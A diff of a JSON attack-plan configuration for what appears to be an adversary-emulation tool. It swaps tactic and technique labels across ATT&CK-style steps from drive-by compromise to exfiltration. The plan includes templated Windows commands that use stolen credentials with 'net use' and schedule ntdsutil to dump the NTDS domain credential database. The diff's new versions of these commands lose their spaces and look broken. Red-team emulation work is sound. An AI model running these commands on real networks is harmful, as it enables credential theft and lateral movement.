@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,32 +49,32 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX2",
             "preconditions": {
                 "payload": "self.tool_name2",
@@ -83,8 +83,8 @@
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -95,8 +95,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -107,8 +107,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -119,8 +119,8 @@
             }
         },
         {
-            "tactic": "Keylogging",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "Keylogging",
             "label": "Get-keyboard-data_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -132,8 +132,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "DiscoverDomainAccounts_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -142,8 +142,8 @@
             }
         },
         {
-            "tactic": "RemoteServices_NetUse",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "RemoteServices_NetUse",
             "label": "Netuse_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -151,13 +151,13 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "net use \\\\${self.target_2_hostname} /User:${self.target_2_username}@${self.domain} ${self.target_2_password}"
+                    "command": "net use \\\\${self.target_2_hostname}/User:${self.target_2_username}@${self.domain}${self.target_2_password}"
                 }
             }
         },
         {
-            "tactic": "RemoteFileCopy_RoboCopy",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "RemoteFileCopy_RoboCopy",
             "label": "Filecopy_t2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -167,8 +167,8 @@
             }
         },
         {
-            "tactic": "ScheduledTask",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "ScheduledTask",
             "label": "ScheduledTask",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -177,13 +177,13 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.target_2_taskname} /TR 'c:\\windows\\system32\\ntdsutil.exe \"activate instance ntds\" ifm \"create full c:\\test\" q q'  /RL Highest /U ${self.target_2_username}@${self.domain} /P ${self.target_2_password} /RU ${self.target_2_username}@${self.domain} /RP ${self.target_2_password} /S ${self.target_2_hostname}"
+                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_2_taskname}/TR 'c:\\windows\\system32\\ntdsutil.exe \"activate instance ntds\" ifm \"create full c:\\test\" q q'  /RL Highest /U${self.target_2_username}@${self.domain}/P${self.target_2_password}/RU${self.target_2_username}@${self.domain}/RP${self.target_2_password}/S${self.target_2_hostname}"
                 }
             }
         },
         {
-            "tactic": "ScheduledTaskExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -192,13 +192,13 @@
                 "target_1": "self.target_1",
                 "target_2": "self.target_2",
                 "tune": {
-                    "command": "cmd.exe /c schtasks.exe /run /tn ${self.target_2_taskname} /U ${self.target_2_username}@${self.domain} /P ${self.target_2_password} /S ${self.target_2_hostname}"
+                    "command": "cmd.exe /c schtasks.exe /run /tn${self.target_2_taskname}/U${self.target_2_username}@${self.domain}/P${self.target_2_password}/S${self.target_2_hostname}"
                 }
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_2",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -208,8 +208,8 @@
             }
         },
         {
-            "tactic": "DisableWindowsEventLogging",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "DisableWindowsEventLogging",
             "label": "DisableWindowsEventLogging_t2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -218,8 +218,8 @@
             }
         },
         {
-            "tactic": "ProcessDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -231,8 +231,8 @@
             }
         },
         {
-            "tactic": "Ntds",
-            "technique": "CredentialAccess",
+            "tactic": "CredentialAccess",
+            "technique": "Ntds",
             "label": "CredentialAccess_NTDS_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -241,8 +241,8 @@
             }
         },
         {
-            "tactic": "FileAndDirectoryDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "FileAndDirectoryDiscovery",
             "label": "FileAndDirectoryDiscovery_t2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -251,8 +251,8 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "GetIntercepterTool_t2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -267,8 +267,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -281,8 +281,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -291,8 +291,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
